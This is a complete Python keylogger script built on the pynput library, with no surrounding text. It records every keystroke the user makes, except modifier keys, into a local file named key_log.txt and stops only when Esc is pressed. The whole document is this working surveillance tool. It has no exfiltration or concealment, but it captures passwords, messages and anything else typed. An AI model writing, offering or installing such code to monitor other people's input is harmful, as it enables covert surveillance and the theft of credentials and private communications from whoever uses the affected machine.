from pynput import keyboard

# Initialize the set of keys currently pressed
keys_pressed = set()

def on_press(key):
    if key not in keys_pressed:
        keys_pressed.add(key)
        try:
            with open("key_log.txt", "a") as log_file:
                if key == keyboard.Key.space:
                    log_file.write(" ")
                elif key == keyboard.Key.enter:
                    log_file.write("\n")
                else:
                    log_file.write(f"{key.char}")
        except AttributeError:
            with open("key_log.txt", "a") as log_file:
                if key not in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.caps_lock]:
                    log_file.write(f"[{key.name}]")

def on_release(key):
    if key in keys_pressed:
        keys_pressed.remove(key)
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
